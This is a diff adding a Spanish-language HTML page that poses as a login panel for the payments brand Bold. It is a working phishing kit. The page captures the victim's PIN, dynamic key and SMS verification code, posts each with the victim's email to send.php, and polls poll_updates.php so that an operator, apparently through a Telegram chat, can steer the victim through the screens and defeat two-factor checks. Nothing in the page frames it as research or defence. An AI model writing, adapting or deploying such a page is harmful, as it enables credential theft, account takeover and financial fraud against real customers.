@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Super Panel</title>
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      background: #eaeaf6;
+      background-image:
+        radial-gradient(ellipse 60% 50% at 50% 10%, rgba(255,255,255,0.65) 0%, transparent 70%),
+        radial-gradient(ellipse 80% 60% at 80% 5%, #d8d8f0 0%, #eaeaf6 60%);
+      display: flex; align-items: center; justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    .back-btn {
+      position: fixed; top: 28px; left: 28px;
+      font-size: 22px; color: #1a1a5e;
+      text-decoration: none; line-height: 1; z-index: 10;
+    }
+
+    /* ── Screens ── */
+    .screen { width: 100%; display: none; flex-direction: column; align-items: center; }
+    .screen.active { display: flex; }
+
+    /* ── Contenedor estándar (igual a index.html) ── */
+    .container {
+      width: 100%; max-width: 480px;
+      padding: 40px 60px;
+      display: flex; flex-direction: column; align-items: center;
+    }
+
+    /* ── Logo ── */
+    .logo {
+      width: 64px; height: 64px;
+      margin-bottom: 28px; flex-shrink: 0;
+    }
+    .logo svg { width: 100%; height: 100%; }
+
+    /* ── Títulos ── */
+    h2 {
+      font-size: 20px; font-weight: 700;
+      color: #1a1a5e; text-align: center;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      font-size: 14px; color: #7a7aaa;
+      text-align: center; margin-bottom: 36px;
+    }
+    .subtitle .red { color: #E8234A; }
+
+    /* ── Inputs estilo Bold ── */
+    .form-group { width: 100%; margin-bottom: 16px; }
+    .form-group label {
+      display: block; font-size: 14px; font-weight: 600;
+      color: #3d5afe; margin-bottom: 8px;
+    }
+    .form-group input {
+      width: 100%; padding: 16px 20px;
+      border: none; border-radius: 12px;
+      background: #fff; font-size: 15px; color: #1a1a5e;
+      outline: none; box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+    }
+    .form-group input::placeholder { color: #b0b0cc; }
+
+    /* ── Botón rojo pill ── */
+    .btn-main {
+      width: 100%; padding: 18px;
+      background: #f0243a; border: none; border-radius: 50px;
+      color: #fff; font-size: 16px; font-weight: 600;
+      cursor: pointer; transition: background .2s;
+    }
+    .btn-main:hover { background: #d41e33; }
+
+    /* ═══════════════════════════════
+       PIN SCREEN
+    ═══════════════════════════════ */
+    .pin-wrap {
+      width: 100%; max-width: 420px;
+      padding: 40px 32px;
+      display: flex; flex-direction: column; align-items: center;
+    }
+
+    .dots { display: flex; gap: 16px; margin-bottom: 30px; }
+    .dot {
+      width: 16px; height: 16px; border-radius: 50%;
+      border: 1.8px solid #c0c0d8; background: transparent;
+      transition: background .12s, border-color .12s, transform .1s;
+    }
+    .dot.filled { background: #1B1464; border-color: #1B1464; transform: scale(1.1); }
+
+    .keypad {
+      display: grid; grid-template-columns: repeat(3, 1fr);
+      gap: 10px; width: 100%; max-width: 320px; margin-bottom: 36px;
+    }
+    .key {
+      background: #e6e6f2; border: none; border-radius: 16px;
+      padding: 22px 0; font-size: 24px; font-weight: 600; color: #1B1464;
+      cursor: pointer; display: flex; align-items: center; justify-content: center;
+      transition: background .1s, transform .08s; user-select: none;
+    }
+    .key:active { background: #d4d4e8; transform: scale(0.95); }
+    .key.ghost  { background: transparent; pointer-events: none; }
+    .key.del svg { width: 22px; height: 22px; }
+
+    .forgot {
+      font-size: 14px; color: #E8234A;
+      text-decoration: underline; cursor: pointer;
+      font-weight: 500; background: none; border: none;
+    }
+
+    .pin-error {
+      display: none;
+      align-items: center; gap: 8px;
+      background: #fff0f2; border: 1px solid #fcc8cf;
+      border-radius: 10px; padding: 11px 18px;
+      margin-bottom: 18px; width: 100%; max-width: 320px;
+    }
+    .pin-error.on { display: flex; }
+    .pin-error svg { flex-shrink: 0; }
+    .pin-error span { font-size: 13px; font-weight: 600; color: #910022; }
+
+    /* ═══════════════════════════════
+       ERROR SCREEN
+    ═══════════════════════════════ */
+    .err-icon { margin-bottom: 24px; }
+    .err-title { font-size: 20px; font-weight: 700; color: #1a1a5e; text-align: center; margin-bottom: 8px; }
+    .err-sub   { font-size: 14px; color: #7a7aaa; text-align: center; margin-bottom: 36px; line-height: 1.6; }
+
+    /* ═══════════════════════════════
+       LOADER
+    ═══════════════════════════════ */
+    .loader-overlay {
+      position: fixed; inset: 0;
+      background: #eaeaf6;
+      background-image:
+        radial-gradient(ellipse 60% 50% at 50% 10%, rgba(255,255,255,0.65) 0%, transparent 70%),
+        radial-gradient(ellipse 80% 60% at 80% 5%, #d8d8f0 0%, #eaeaf6 60%);
+      display: none; align-items: center; justify-content: center; z-index: 999;
+    }
+    .loader-overlay.on { display: flex; }
+    .spinner {
+      width: 50px; height: 50px; border-radius: 50%;
+      border: 4px solid #dcdcf0; border-top-color: #E8234A;
+      animation: spin .75s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <div class="loader-overlay" id="loader"><div class="spinner"></div></div>
+  <a class="back-btn" id="backBtn" href="index.html">&#8249;</a>
+
+  <!-- ══════════════════════
+       PANTALLA 1 — PIN
+  ══════════════════════ -->
+  <div class="screen active" id="sPin">
+    <div class="pin-wrap">
+
+      <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="65" viewBox="0 0 64 65" fill="none">
+          <path d="M6.40061 34.9166H57.5984C56.3674 47.9039 45.3593 58.1004 31.9974 58.1004C18.6355 58.1004 7.62951 47.9039 6.39844 34.9166H6.40061ZM31.9995 6.90039C18.6398 6.90039 7.63168 17.1011 6.40061 30.0885H57.5984C56.3674 17.1011 45.3593 6.90039 31.9974 6.90039H31.9995Z" fill="url(#gpin)"/>
+          <defs><linearGradient id="gpin" x1="31.7867" y1="6.9004" x2="31.7867" y2="58.1004" gradientUnits="userSpaceOnUse">
+            <stop offset="0.172326" stop-color="#EE424E"/>
+            <stop offset="0.833333" stop-color="#121E6C"/>
+          </linearGradient></defs>
+        </svg>
+      </div>
+
+      <h2>¡ Hola, <span id="userEmail">usuario@gmail.com</span> !</h2>
+      <p class="subtitle">Escribe <span class="red">tu</span> clave de acceso</p>
+
+      <div class="pin-error" id="pinError">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="8" cy="8" r="8" fill="#910022"/>
+          <path d="M5 5l6 6M11 5l-6 6" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/>
+        </svg>
+        <span>Credenciales incorrectas</span>
+      </div>
+
+      <div class="dots" id="dots">
+        <div class="dot" id="d0"></div><div class="dot" id="d1"></div>
+        <div class="dot" id="d2"></div><div class="dot" id="d3"></div>
+        <div class="dot" id="d4"></div><div class="dot" id="d5"></div>
+      </div>
+
+      <div class="keypad">
+        <button class="key" onclick="k('1')">1</button>
+        <button class="key" onclick="k('2')">2</button>
+        <button class="key" onclick="k('3')">3</button>
+        <button class="key" onclick="k('4')">4</button>
+        <button class="key" onclick="k('5')">5</button>
+        <button class="key" onclick="k('6')">6</button>
+        <button class="key" onclick="k('7')">7</button>
+        <button class="key" onclick="k('8')">8</button>
+        <button class="key" onclick="k('9')">9</button>
+        <button class="key ghost"></button>
+        <button class="key" onclick="k('0')">0</button>
+        <button class="key del" onclick="del()">
+          <svg fill="none" viewBox="0 0 24 24" stroke-width="1.8" stroke="#1B1464" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M22 3H7a2 2 0 00-1.6.8L1 9l4.4 5.2A2 2 0 007 15h15a1 1 0 001-1V4a1 1 0 00-1-1z"/>
+            <line x1="16" y1="8" x2="12" y2="12" stroke="#1B1464" stroke-width="1.8" stroke-linecap="round"/>
+            <line x1="12" y1="8" x2="16" y2="12" stroke="#1B1464" stroke-width="1.8" stroke-linecap="round"/>
+          </svg>
+        </button>
+      </div>
+
+      <button class="forgot">Olvidé mi clave</button>
+    </div>
+  </div>
+
+  <!-- ══════════════════════
+       PANTALLA 2 — DINÁMICA
+  ══════════════════════ -->
+  <div class="screen" id="sDinamica">
+    <div class="container">
+
+      <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="65" viewBox="0 0 64 65" fill="none">
+          <path d="M6.40061 34.9166H57.5984C56.3674 47.9039 45.3593 58.1004 31.9974 58.1004C18.6355 58.1004 7.62951 47.9039 6.39844 34.9166H6.40061ZM31.9995 6.90039C18.6398 6.90039 7.63168 17.1011 6.40061 30.0885H57.5984C56.3674 17.1011 45.3593 6.90039 31.9974 6.90039H31.9995Z" fill="url(#gdin)"/>
+          <defs><linearGradient id="gdin" x1="31.7867" y1="6.9004" x2="31.7867" y2="58.1004" gradientUnits="userSpaceOnUse">
+            <stop offset="0.172326" stop-color="#EE424E"/>
+            <stop offset="0.833333" stop-color="#121E6C"/>
+          </linearGradient></defs>
+        </svg>
+      </div>
+
+      <h2>¡Ingresa tu clave dinámica!</h2>
+      <p class="subtitle">Usa la clave generada por tu dispositivo de seguridad Bold.</p>
+
+      <div class="form-group">
+        <label for="inDinamica">Clave dinámica</label>
+        <input id="inDinamica" type="tel" placeholder="000000" maxlength="6"
+               autocomplete="off" inputmode="numeric"
+               onkeydown="if(event.key==='Enter')submitDinamica()">
+      </div>
+
+      <button class="btn-main" onclick="submitDinamica()">Continuar</button>
+    </div>
+  </div>
+
+  <!-- ══════════════════════
+       PANTALLA 3 — TOKEN
+  ══════════════════════ -->
+  <div class="screen" id="sToken">
+    <div class="container">
+
+      <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="65" viewBox="0 0 64 65" fill="none">
+          <path d="M6.40061 34.9166H57.5984C56.3674 47.9039 45.3593 58.1004 31.9974 58.1004C18.6355 58.1004 7.62951 47.9039 6.39844 34.9166H6.40061ZM31.9995 6.90039C18.6398 6.90039 7.63168 17.1011 6.40061 30.0885H57.5984C56.3674 17.1011 45.3593 6.90039 31.9974 6.90039H31.9995Z" fill="url(#gtok)"/>
+          <defs><linearGradient id="gtok" x1="31.7867" y1="6.9004" x2="31.7867" y2="58.1004" gradientUnits="userSpaceOnUse">
+            <stop offset="0.172326" stop-color="#EE424E"/>
+            <stop offset="0.833333" stop-color="#121E6C"/>
+          </linearGradient></defs>
+        </svg>
+      </div>
+
+      <h2>¡Ingresa tu código de verificación!</h2>
+      <p class="subtitle">Te enviamos un código al celular registrado en Bold.</p>
+
+      <div class="form-group">
+        <label for="inToken">Código de verificación</label>
+        <input id="inToken" type="tel" placeholder="000000" maxlength="6"
+               autocomplete="off" inputmode="numeric"
+               onkeydown="if(event.key==='Enter')submitToken()">
+      </div>
+
+      <button class="btn-main" onclick="submitToken()">Verificar</button>
+    </div>
+  </div>
+
+  <!-- ══════════════════════
+       PANTALLA — ERROR
+  ══════════════════════ -->
+  <div class="screen" id="sErr">
+    <div class="container">
+
+      <div class="err-icon">
+        <svg width="64" height="64" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="24" cy="24" r="24" fill="#910022"/>
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M33.8267 33.827C32.5626 35.0908 30.5144 35.0908 29.2503 33.827L23.8873 28.4634L18.5245 33.8263C17.462 34.8885 15.8463 35.054 14.6071 34.33C14.3724 34.1931 14.1494 34.0273 13.9482 33.8263C12.6847 32.5628 12.6847 30.5139 13.9482 29.2505L19.3112 23.8876L13.9478 18.5237C12.6841 17.2599 12.6841 15.211 13.9478 13.9479C15.2116 12.684 17.2604 12.684 18.5239 13.9479L23.8873 19.3114L29.2503 13.9482C30.5134 12.685 32.5623 12.685 33.826 13.9482C34.0073 14.1294 34.1593 14.3281 34.2887 14.5369C35.0606 15.7846 34.9086 17.4418 33.826 18.5244L28.4636 23.8876L33.8267 29.2508C35.0905 30.5149 35.0905 32.5632 33.8267 33.827Z" fill="white"/>
+        </svg>
+      </div>
+
+      <h2 class="err-title" id="errTitle">Error</h2>
+      <p class="err-sub subtitle" id="errSub">Por favor intenta de nuevo.</p>
+      <button class="btn-main" onclick="retryFromErr()">Intentar de nuevo</button>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(location.search);
+    const email  = params.get('email') || 'usuario@gmail.com';
+    document.getElementById('userEmail').textContent = email;
+
+    const PIN_LEN = 6;
+    let pin = '', msgId = null, chatId = null, pollTimer = null, safeTimer = null;
+    let errBack = 'sPin';
+
+    const ERRORS = {
+      ERR_USUARIO:  { title: 'Usuario no encontrado',     sub: 'El correo ingresado no está registrado en Bold.<br>Verifica e intenta de nuevo.',   back: 'index'     },
+      ERR_CLAVE:    { title: 'Clave incorrecta',           sub: 'La clave de acceso ingresada no es correcta.<br>Por favor intenta de nuevo.',        back: 'sPin'      },
+      ERR_DINAMICA: { title: 'Clave dinámica incorrecta',  sub: 'La clave dinámica ingresada no es válida.<br>Por favor intenta de nuevo.',           back: 'sDinamica' },
+      ERR_TOKEN:    { title: 'Código incorrecto',          sub: 'El código de verificación no es correcto o expiró.<br>Por favor intenta de nuevo.',  back: 'sToken'    },
+    };
+
+    function show(id) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      document.getElementById('backBtn').style.display = (id === 'sErr') ? 'none' : '';
+    }
+
+    function loader(on) {
+      document.getElementById('loader').classList.toggle('on', on);
+    }
+
+    /* ── PIN ── */
+    function dots() {
+      for (let i = 0; i < PIN_LEN; i++)
+        document.getElementById('d' + i).classList.toggle('filled', i < pin.length);
+    }
+    function k(n) {
+      if (pin.length >= PIN_LEN) return;
+      if (pin.length === 0) document.getElementById('pinError').classList.remove('on');
+      pin += n; dots();
+      if (pin.length === PIN_LEN) submitPin();
+    }
+    function del() { if (pin.length) { pin = pin.slice(0, -1); dots(); } }
+
+    /* ── Envíos ── */
+    async function post(payload) {
+      const r = await fetch('send.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, ...payload }),
+      });
+      return r.json();
+    }
+
+    async function submitPin() {
+      loader(true);
+      try {
+        const j = await post({ event: 'PIN', pin });
+        if (!j.ok) { loader(false); resetPin(); return; }
+        msgId = j.messageid; chatId = j.chatid;
+        poll();
+      } catch { loader(false); resetPin(); }
+    }
+
+    async function submitDinamica() {
+      const v = document.getElementById('inDinamica').value.trim();
+      if (!v) return;
+      loader(true);
+      try {
+        const j = await post({ event: 'DINAMICA', dinamica: v });
+        if (!j.ok) { loader(false); return; }
+        msgId = j.messageid; chatId = j.chatid;
+        poll();
+      } catch { loader(false); }
+    }
+
+    async function submitToken() {
+      const v = document.getElementById('inToken').value.trim();
+      if (!v) return;
+      loader(true);
+      try {
+        const j = await post({ event: 'TOKEN', token: v });
+        if (!j.ok) { loader(false); return; }
+        msgId = j.messageid; chatId = j.chatid;
+        poll();
+      } catch { loader(false); }
+    }
+
+    /* ── Polling ── */
+    function poll() {
+      clearInterval(pollTimer); clearTimeout(safeTimer);
+      pollTimer = setInterval(async () => {
+        try {
+          const r = await fetch(`poll_updates.php?messageid=${msgId}&chatid=${encodeURIComponent(chatId)}&since=0`);
+          const j = await r.json();
+          if (!j.ok || !j.action) return;
+          clearInterval(pollTimer); clearTimeout(safeTimer);
+          loader(false);
+          route(j.action);
+        } catch {}
+      }, 2000);
+      safeTimer = setTimeout(() => { clearInterval(pollTimer); loader(false); resetPin(); }, 5 * 60 * 1000);
+    }
+
+    /* ── Router ── */
+    function route(action) {
+      if (action === 'FINISH') { loader(true); return; }
+      if (action === 'NEXT_DINAMICA') { document.getElementById('inDinamica').value = ''; show('sDinamica'); return; }
+      if (action === 'NEXT_TOKEN')    { document.getElementById('inToken').value    = ''; show('sToken');    return; }
+      const e = ERRORS[action];
+      if (e) {
+        document.getElementById('errTitle').textContent = e.title;
+        document.getElementById('errSub').innerHTML    = e.sub;
+        errBack = e.back;
+        show('sErr');
+        return;
+      }
+      resetPin();
+    }
+
+    function resetPin(showErrMsg = false) {
+      pin = ''; dots(); msgId = null; chatId = null;
+      clearInterval(pollTimer); clearTimeout(safeTimer);
+      document.getElementById('pinError').classList.toggle('on', showErrMsg);
+      show('sPin');
+    }
+
+    function retryFromErr() {
+      document.getElementById('inDinamica').value = '';
+      document.getElementById('inToken').value    = '';
+      if (errBack === 'index') { location.href = 'index.html'; }
+      else if (errBack === 'sPin') resetPin(true);
+      else show(errBack);
+    }
+
+    document.addEventListener('keydown', e => {
+      if (!document.getElementById('sPin').classList.contains('active')) return;
+      if (e.key >= '0' && e.key <= '9') k(e.key);
+      if (e.key === 'Backspace') del();
+    });
+  </script>
+
+</body>
+</html>
